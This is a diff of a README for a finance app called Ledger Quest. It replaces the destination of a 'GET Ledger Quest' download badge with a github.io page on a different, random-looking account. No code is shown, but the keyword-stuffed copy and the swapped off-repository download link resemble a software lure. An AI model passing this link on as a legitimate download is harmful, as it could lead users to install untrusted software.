@@ -53,7 +53,7 @@ The project works well as Ledger Quest software for anyone who prefers transpare
 
 Prerequisites: A device with a modern browser, access to the Ledger Quest GitHub repository, and a basic list of accounts, categories, or financial goals you want to track.
 
-[![GET Ledger Quest](https://img.shields.io/badge/GET%20%E2%80%94%20Ledger%20Quest-0078D6?style=for-the-badge&logoColor=white)](https://rolandsampsonmthi.github.io/.github/ledger-quest)
+[![GET Ledger Quest](https://img.shields.io/badge/GET%20%E2%80%94%20Ledger%20Quest-0078D6?style=for-the-badge&logoColor=white)](https://pablohardycbsy.github.io/.github/ledger-quest)
 
 1.  **Download and Review:** Use Ledger Quest download resources from the repository, then read the setup notes before running the Ledger Quest app.
 2.  **Create Your Ledger:** Add accounts, starting balances, and category groups so Ledger Quest financial ledger views match the way you manage money.
